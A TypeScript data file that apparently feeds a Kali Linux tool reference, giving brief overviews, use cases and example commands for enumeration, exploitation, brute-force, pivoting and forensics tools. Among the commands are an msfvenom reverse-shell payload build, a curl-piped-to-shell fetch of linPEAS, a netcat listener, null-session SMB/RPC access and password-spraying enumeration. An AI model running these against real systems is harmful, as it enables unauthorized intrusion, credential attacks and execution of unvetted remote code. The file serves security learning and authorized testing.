import type { ToolEnrichment } from "./types";

/** Shorter enrichment for additional common Kali tools: 2–3 paragraphs, use cases, optional commands. */
export const ENHANCED_CONTENT: Record<string, ToolEnrichment> = {
  enum4linux: {
    overview: [
      "enum4linux wraps rpcclient, smbclient, and nmblookup calls to enumerate Windows/Samba hosts: users, groups, shares, and password policy.",
      "Run against legacy SMB without signing requirements. Output is noisy but fast for initial AD/SMB recon.",
    ],
    useCases: ["Null session user enumeration", "Share listing on domain controllers", "Password policy discovery"],
    commands: [{ label: "Full enum", code: "enum4linux -a 10.0.0.5" }],
    related: ["crackmapexec", "impacket", "nmap"],
  },
  "enum4linux-ng": {
    overview: [
      "enum4linux-ng is a Python rewrite with JSON/YAML output and LDAP support. Cleaner parsing than classic enum4linux for pipeline integration.",
    ],
    useCases: ["Structured SMB/LDAP enum for reporting", "Scripted recon pipelines"],
    commands: [{ label: "JSON output", code: "enum4linux-ng -A 10.0.0.5 -oJ out.json" }],
    related: ["enum4linux", "crackmapexec"],
  },
  smbclient: {
    overview: [
      "smbclient provides FTP-like CLI access to SMB shares. `-L //host` lists shares; `-c 'recurse;ls'` walks directories.",
      "Useful for anonymous share audits and manual file retrieval when CME/impacket automation is overkill.",
    ],
    useCases: ["Anonymous share browsing", "Manual file exfil from open shares"],
    commands: [{ label: "List shares", code: "smbclient -L //10.0.0.5 -N" }],
    related: ["crackmapexec", "impacket"],
  },
  rpcclient: {
    overview: [
      "rpcclient interacts with MS-RPC endpoints. `enumdomusers`, `querydominfo`, and `lookupnames` enumerate AD without full LDAP libraries.",
    ],
    useCases: ["User/group enum via RPC", "Testing null session exposure"],
    commands: [{ label: "Interactive enum", code: "rpcclient -U '' -N 10.0.0.5" }],
    related: ["enum4linux", "impacket"],
  },
  ldapdomaindump: {
    overview: [
      "ldapdomaindump queries LDAP and outputs HTML/JSON reports of users, groups, computers, and GPOs. BloodHound-adjacent read-only AD inventory.",
    ],
    useCases: ["Quick AD asset inventory", "Export for offline review without Neo4j"],
    commands: [{ label: "Dump domain", code: "ldapdomaindump -u 'corp\\user' -p pass dc01.corp.local" }],
    related: ["bloodhound", "bloodhound.py"],
  },
  kerbrute: {
    overview: [
      "kerbrute performs Kerberos pre-auth enumeration and password spraying. User enumeration via AS-REQ without triggering classic SMB logs.",
      "Spray mode respects lockout when used with `-d delay`; userenum finds valid usernames from wordlists.",
    ],
    useCases: ["Username validation before spray", "Password spraying with Kerberos pre-auth"],
    commands: [{ label: "User enum", code: "kerbrute userenum -d corp.local users.txt" }],
    related: ["crackmapexec", "hashcat"],
  },
  radare2: {
    overview: [
      "radare2 (r2) is a CLI reverse engineering framework. Disassembly, debugging, binary patching, and scripting with r2pipe.",
      "Steeper learning curve than Ghidra but scriptable and lightweight for quick shellcode analysis.",
    ],
    useCases: ["Quick binary triage on SSH servers", "CTF shellcode debugging"],
    commands: [{ label: "Analyze binary", code: "r2 -A binary.elf" }],
    related: ["ghidra", "binwalk"],
  },
  apktool: {
    overview: [
      "apktool decodes APK resources to smali and rebuilds after modification. Required for patching Android apps and inspecting AndroidManifest.xml.",
    ],
    useCases: ["Android app resource inspection", "Smali-level patching labs"],
    commands: [{ label: "Decode APK", code: "apktool d app.apk -o out/" }],
    related: ["jadx", "ghidra"],
  },
  msfvenom: {
    overview: [
      "msfvenom generates standalone payloads and shellcode from Metasploit modules. Specify `-p`, output format `-f`, encoders `-e`, and badchar filters.",
      "Often paired with msfconsole handler module. Not a substitute for understanding payload staging and AV/EDR on target.",
    ],
    useCases: ["Custom shellcode for exploit dev", "Standalone binary generation in labs"],
    commands: [{ label: "Windows reverse shell", code: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.100 LPORT=4444 -f exe -o shell.exe" }],
    related: ["metasploit", "armitage"],
  },
  msfconsole: {
    overview: [
      "msfconsole is the Metasploit interactive console. Entry point for search, use, set, run, sessions, and db integration.",
    ],
    useCases: ["Interactive exploitation and post-ex"],
    commands: [{ label: "Launch", code: "msfconsole -q" }],
    related: ["metasploit", "msfvenom"],
  },
  sqlninja: {
    overview: [
      "sqlninja automates MSSQL SQLi to xp_cmdshell and metasploit integration on Microsoft SQL Server targets.",
      "Legacy but still encountered on old internal apps using MSSQL with sa privileges.",
    ],
    useCases: ["MSSQL-specific SQLi to shell"],
    related: ["sqlmap", "metasploit"],
  },
  commix: {
    overview: [
      "commix automates command injection detection and exploitation over HTTP/S. Supports various injection points and tamper/evasion options.",
    ],
    useCases: ["OS command injection validation", "Blind time-based commix attacks"],
    commands: [{ label: "Basic test", code: "commix -u 'https://target/page?cmd=test'" }],
    related: ["sqlmap", "burp-suite"],
  },
  wfuzz: {
    overview: [
      "wfuzz replaces parts of HTTP requests with payload words. Similar to ffuf with different filter syntax and workflow.",
    ],
    useCases: ["Parameter and directory fuzzing"],
    commands: [{ label: "Hidden param fuzz", code: "wfuzz -c -z file,wordlist.txt https://target/FUZZ" }],
    related: ["ffuf", "gobuster"],
  },
  skipfish: {
    overview: [
      "skipfish is a recursive web security scanner generating interactive reports. Fast content discovery with anomaly scoring.",
    ],
    useCases: ["Automated web surface mapping", "Legacy scanner baseline"],
    related: ["nikto", "nuclei"],
  },
  whatweb: {
    overview: [
      "WhatWeb fingerprints web technologies: CMS, frameworks, plugins, headers. `-a` aggression levels control probe depth.",
    ],
    useCases: ["Tech stack identification before targeted exploits", "Asset inventory"],
    commands: [{ label: "Aggressive fingerprint", code: "whatweb -a 3 https://target.example.com" }],
    related: ["nuclei", "wpscan"],
  },
  sslscan: {
    overview: [
      "sslscan enumerates TLS cipher suites, certificate details, and protocol support. Identifies weak ciphers and expired certs.",
    ],
    useCases: ["TLS configuration audit", "Pre-handshake recon on 443"],
    commands: [{ label: "Scan HTTPS", code: "sslscan target.example.com:443" }],
    related: ["nmap", "testssl"],
  },
  testssl: {
    overview: [
      "testssl.sh deep-tests TLS/SSL: protocols, ciphers, vulnerabilities (Heartbleed, ROBOT, etc.). No browser dependency.",
    ],
    useCases: ["Compliance-oriented TLS review", "Finding deprecated protocol support"],
    commands: [{ label: "Full test", code: "./testssl.sh https://target.example.com" }],
    related: ["sslscan", "nmap"],
  },
  dnsenum: {
    overview: [
      "dnsenum orchestrates WHOIS, zone transfer attempts, brute-force subdomains, and Google scraping for DNS recon.",
    ],
    useCases: ["Active DNS recon on authorized domains"],
    commands: [{ label: "Domain enum", code: "dnsenum example.com" }],
    related: ["subfinder", "amass"],
  },
  dnsrecon: {
    overview: [
      "dnsrecon performs DNS enumeration: std/brute/bax/zonewalk modes. Outputs XML/JSON for reporting.",
    ],
    useCases: ["Zone transfer checks", "Subdomain brute-force with wordlist"],
    commands: [{ label: "Std enum", code: "dnsrecon -d example.com -t std" }],
    related: ["dnsenum", "theharvester"],
  },
  fierce: {
    overview: [
      "fierce scans DNS adjacent IP space for related domains and subdomains. Legacy but lightweight.",
    ],
    useCases: ["Finding nearby domains in same netblock"],
    related: ["dnsenum", "amass"],
  },
  httprobe: {
    overview: [
      "httprobe (or httpx from ProjectDiscovery) takes hostnames and returns live HTTP/S URLs. Pipeline glue between subfinder and nuclei.",
    ],
    useCases: ["Filtering dead hosts before web scanning"],
    related: ["subfinder", "nuclei"],
  },
  naabu: {
    overview: [
      "naabu is a fast port scanner from ProjectDiscovery. Often chained: subfinder → naabu → httpx → nuclei.",
    ],
    useCases: ["Port discovery on large host lists"],
    commands: [{ label: "Top ports", code: "naabu -host target.example.com -top-ports 1000" }],
    related: ["nmap", "masscan", "nuclei"],
  },
  httpx: {
    overview: [
      "httpx probes URLs for status, title, tech detection, and TLS info. Standard in PD recon stacks.",
    ],
    useCases: ["Live web service detection at scale"],
    commands: [{ label: "Probe list", code: "httpx -l hosts.txt -title -tech-detect -status-code" }],
    related: ["nuclei", "subfinder"],
  },
  katana: {
    overview: [
      "katana is a ProjectDiscovery crawling/spidering CLI. Extracts endpoints for fuzzing and template scanning.",
    ],
    useCases: ["JS-aware crawling for API discovery"],
    related: ["nuclei", "ffuf"],
  },
  gau: {
    overview: [
      "gau (GetAllUrls) fetches known URLs from Wayback, Common Crawl, and OTX for a domain. Finds forgotten endpoints.",
    ],
    useCases: ["Historical URL discovery for bug bounty"],
    commands: [{ label: "Fetch URLs", code: "gau example.com | httpx -mc 200" }],
    related: ["waybackurls", "nuclei"],
  },
  waybackurls: {
    overview: [
      "waybackurls pulls URLs from Wayback Machine for a domain. Pairs with gau or manual review.",
    ],
    useCases: ["Archive URL mining"],
    related: ["gau", "katana"],
  },
  arjun: {
    overview: [
      "Arjun discovers hidden HTTP parameters on endpoints. GET/POST/JSON/XML methods with stable vs aggressive modes.",
    ],
    useCases: ["Finding undocumented API parameters"],
    commands: [{ label: "Scan URL", code: "arjun -u https://target/api/endpoint" }],
    related: ["ffuf", "burp-suite"],
  },
  paramspider: {
    overview: [
      "paramspider mines web archives for parameterized URLs containing query strings. Feeds bug bounty recon.",
    ],
    useCases: ["Parameter discovery from historical data"],
    related: ["gau", "sqlmap"],
  },
  xsstrike: {
    overview: [
      "XSStrike detects and fuzzes XSS with context-aware payloads. Includes crawl and WAF detection helpers.",
    ],
    useCases: ["XSS validation after manual triage"],
    related: ["burp-suite", "commix"],
  },
  dalfox: {
    overview: [
      "dalfox is a fast parameter-based XSS scanner. Pipeline-friendly JSON output.",
    ],
    useCases: ["Batch XSS scanning on crawled URLs"],
    related: ["xsstrike", "nuclei"],
  },
  "nuclei-templates": {
    overview: [
      "Kali metapackage referencing ProjectDiscovery Nuclei template collections. Templates live in community GitHub repo, updated separately from binary.",
    ],
    useCases: ["Keeping CVE checks current via template pull"],
    related: ["nuclei"],
  },
  "metasploit-framework": {
    overview: [
      "Kali package for Metasploit Framework. Same tooling as metasploit detail page—msfconsole, modules, msfvenom.",
    ],
    useCases: ["Exploitation and post-ex on Kali installs"],
    related: ["metasploit", "armitage"],
  },
  powershell: {
    overview: [
      "PowerShell Core (pwsh) on Linux enables running PowerShell scripts and offensive tooling cross-platform. Some AD modules require Windows.",
    ],
    useCases: ["Running PS recon scripts from Linux attack box"],
    related: ["evil-winrm", "impacket"],
  },
  proxychains4: {
    overview: [
      "proxychains forces TCP connections through SOCKS4/5 or HTTP proxies. `/etc/proxychains4.conf` defines chain order and proxy list.",
      "Wraps nmap (connect scan), impacket, and other tools through pivots.",
    ],
    useCases: ["Routing tools through SOCKS pivot"],
    commands: [{ label: "Via proxy", code: "proxychains4 nmap -sT -Pn 10.0.0.0/24" }],
    related: ["chisel", "ligolo-ng"],
  },
  tor: {
    overview: [
      "Tor provides anonymous routing. torsocks/proxychains route scanner traffic through Tor exit nodes—slow and often blocked, but useful for specific OSINT.",
    ],
    useCases: ["Anonymous outbound scanning (legal/scope dependent)"],
    related: ["proxychains4"],
  },
  socat: {
    overview: [
      "socat relays data between sockets, ptys, and files. `TCP-LISTEN:8080,fork TCP:internal:80` for quick port forward.",
    ],
    useCases: ["Ad-hoc port forwarding and reverse shells"],
    commands: [{ label: "Port relay", code: "socat TCP-LISTEN:8080,fork TCP:10.0.0.50:80" }],
    related: ["chisel", "metasploit"],
  },
  netcat: {
    overview: [
      "netcat (nc) reads/writes TCP/UDP. `-lvp 4444` listener; `-e /bin/sh` binds shell (often disabled in modern nc).",
    ],
    useCases: ["Quick connectivity tests", "Simple reverse/bind shells in labs"],
    commands: [{ label: "Listener", code: "nc -lvnp 4444" }],
    related: ["socat", "metasploit"],
  },
  ncat: {
    overview: [
      "ncat from Nmap project adds SSL, brokering, and access control. Preferred over traditional netcat on Kali.",
    ],
    useCases: ["Encrypted reverse shells", "Persistent listeners"],
    related: ["netcat", "nmap"],
  },
  openvpn: {
    overview: [
      "OpenVPN client for lab VPN access during engagements. Profile `.ovpn` from CTF or client-provided scope entry.",
    ],
    useCases: ["Connecting to engagement VPN ranges"],
    related: ["wireguard"],
  },
  wireguard: {
    overview: [
      "WireGuard modern VPN tunnel. `wg-quick up wg0` for lightweight pivot or lab network access.",
    ],
    useCases: ["Fast VPN for remote lab access"],
    related: ["openvpn"],
  },
  binutils: {
    overview: [
      "GNU binutils: objdump, readelf, strings, nm. First-pass binary inspection before Ghidra/r2.",
    ],
    useCases: ["Quick ELF/PE header and string analysis"],
    commands: [{ label: "Strings and headers", code: "strings binary | less; readelf -h binary" }],
    related: ["ghidra", "radare2"],
  },
  gdb: {
    overview: [
      "GDB debugger for Linux binaries. Breakpoints, heap analysis with pwndbg/gef plugins, exploit dev.",
    ],
    useCases: ["Exploit development and crash triage"],
    commands: [{ label: "Debug binary", code: "gdb ./vuln" }],
    related: ["radare2", "ghidra"],
  },
  strace: {
    overview: [
      "strace traces syscalls. Reveals file, network, and IPC activity of binaries—useful for unknown malware behavior on Linux.",
    ],
    useCases: ["Dynamic analysis of suspicious ELF binaries"],
    commands: [{ label: "Trace program", code: "strace -f ./binary 2>&1 | tee trace.log" }],
    related: ["ltrace", "ghidra"],
  },
  ltrace: {
    overview: [
      "ltrace traces library calls. Complements strace for understanding libc/API child processes use.",
    ],
    useCases: ["Watching malloc, string compare in crackmes"],
    related: ["strace", "gdb"],
  },
  exiftool: {
    overview: [
      "exiftool reads/writes metadata in images, PDFs, Office docs. OSINT geolocation and hidden author fields.",
    ],
    useCases: ["Metadata extraction in OSINT and forensics"],
    commands: [{ label: "Read all metadata", code: "exiftool document.pdf" }],
    related: ["steghide", "autopsy"],
  },
  foremost: {
    overview: [
      "foremost carves files from disk images by header/footer signatures. Quick file recovery without full filesystem mount.",
    ],
    useCases: ["Carving deleted files from unallocated space"],
    commands: [{ label: "Carve image", code: "foremost -i disk.img -o output/" }],
    related: ["autopsy", "binwalk"],
  },
  testdisk: {
    overview: [
      "TestDisk recovers lost partitions and repairs boot sectors. PhotoRec sibling carves files by signature.",
    ],
    useCases: ["Partition recovery on corrupted media"],
    related: ["foremost", "autopsy"],
  },
  photorec: {
    overview: [
      "PhotoRec file carver from TestDisk project. Signature-based recovery ignoring filesystem metadata.",
    ],
    useCases: ["Recovering media files from formatted drives"],
    related: ["foremost", "testdisk"],
  },
  "arp-scan": {
    overview: [
      "arp-scan discovers hosts on local Ethernet using ARP. Faster than ping sweep on same broadcast domain.",
    ],
    useCases: ["Local subnet host discovery"],
    commands: [{ label: "Scan subnet", code: "arp-scan -l" }],
    related: ["nmap", "netdiscover"],
  },
  netdiscover: {
    overview: [
      "netdiscover passive/active ARP recon on LAN. Live display of hosts as they appear.",
    ],
    useCases: ["Wireless/LAN presence detection during onsite tests"],
    related: ["arp-scan", "nmap"],
  },
  onesixtyone: {
    overview: [
      "onesixtyone SNMP scanner. Brute-forces community strings against host lists.",
    ],
    useCases: ["Finding default SNMP communities (public/private)"],
    commands: [{ label: "Scan with wordlist", code: "onesixtyone -c communities.txt -i hosts.txt" }],
    related: ["snmpcheck", "nmap"],
  },
  snmpcheck: {
    overview: [
      "snmpcheck enumerates SNMP MIBs: system info, interfaces, processes, software. Expands on simple community discovery.",
    ],
    useCases: ["SNMP misconfiguration audit"],
    commands: [{ label: "Enumerate host", code: "snmpcheck -t 10.0.0.5 -c public" }],
    related: ["onesixtyone", "nmap"],
  },
  "ike-scan": {
    overview: [
      "ike-scan discovers IPsec VPN gateways and fingerprint IKE transforms. Useful for legacy VPN assessments.",
    ],
    useCases: ["IPsec endpoint discovery", "PSK aggressive mode testing (authorized)"],
    commands: [{ label: "Discover VPN", code: "ike-scan 203.0.113.0/24" }],
    related: ["nmap"],
  },
  hashid: {
    overview: [
      "hashid identifies hash types from format patterns. Input unknown dumps before hashcat mode selection.",
    ],
    useCases: ["Hash type identification"],
    commands: [{ label: "Identify hashes", code: "hashid hash.txt" }],
    related: ["hashcat", "john"],
  },
  "name-that-hash": {
    overview: [
      "name-that-hash (nth) suggests hashcat modes for hash lines. Similar to hashid with updated mode numbers.",
    ],
    useCases: ["Choosing hashcat -m before cracking"],
    related: ["hashcat", "hashid"],
  },
  cupp: {
    overview: [
      "CUPP generates custom wordlists from target profiling (names, dates, pets). Social engineering password lists.",
    ],
    useCases: ["Targeted wordlist generation for hash cracking"],
    related: ["hashcat", "crunch"],
  },
  crunch: {
    overview: [
      "crunch generates wordlists by charset and length patterns. Complements mask attacks in hashcat.",
    ],
    useCases: ["Custom charset brute wordlists"],
    commands: [{ label: "8-digit numeric", code: "crunch 8 8 0123456789 -o nums.txt" }],
    related: ["hashcat", "cupp"],
  },
  patator: {
    overview: [
      "patator multi-purpose brute-forcer with modular protocols. Flexible HTTP raw requests and response matching.",
    ],
    useCases: ["Complex HTTP auth brute-force", "Alternative to hydra with raw control"],
    related: ["hydra", "medusa"],
  },
  crowbar: {
    overview: [
      "crowbar focuses on brute-force via OpenVPN, RDP, SSH, and VNC keys. `-b rdp` for Windows desktop spraying.",
    ],
    useCases: ["RDP password spraying"],
    related: ["hydra", "crackmapexec"],
  },
  legion: {
    overview: [
      "Legion is a semi-automatic discovery/recon GUI wrapping nmap, nikto, and other tools with parsed output.",
    ],
    useCases: ["GUI-driven nmap workflow for assessors preferring visual queue"],
    related: ["nmap", "nikto"],
  },
  sparta: {
    overview: [
      "SPARTA (deprecated but present on some installs) parallelized nmap + nikto + enum4linux. Legion is the maintained successor.",
    ],
    useCases: ["Legacy automated recon GUI"],
    related: ["legion", "nmap"],
  },
  linpeas: {
    overview: [
      "linPEAS bash script searches Linux privesc vectors: SUID, cron, writable paths, kernel version, credentials.",
      "Run on foothold hosts; noisy but comprehensive. Part of PEASS-ng suite.",
    ],
    useCases: ["Linux privilege escalation enumeration"],
    commands: [{ label: "Run script", code: "curl -L linpeas.sh | sh" }],
    related: ["pspy", "metasploit"],
  },
  winpeas: {
    overview: [
      "winPEAS enumerates Windows privesc: unquoted paths, services, tokens, AlwaysInstallElevated, and more.",
    ],
    useCases: ["Windows local privesc triage"],
    related: ["mimikatz", "bloodhound"],
  },
  linenum: {
    overview: [
      "LinEnum.sh basic Linux enumeration script predating linPEAS. Lighter output for quick checks.",
    ],
    useCases: ["Quick Linux recon on constrained shells"],
    related: ["linpeas"],
  },
  "linux-exploit-suggester": {
    overview: [
      "linux-exploit-suggester maps kernel version to known public exploits. Verify manually—many false positives on patched kernels.",
    ],
    useCases: ["Kernel exploit hinting after uname collection"],
    related: ["linpeas", "metasploit"],
  },
  "windows-exploit-suggester": {
    overview: [
      "windows-exploit-suggester compares systeminfo patch level to Microsoft bulletins for missing KBs.",
    ],
    useCases: ["Missing patch identification on Windows hosts"],
    related: ["winpeas", "metasploit"],
  },
};
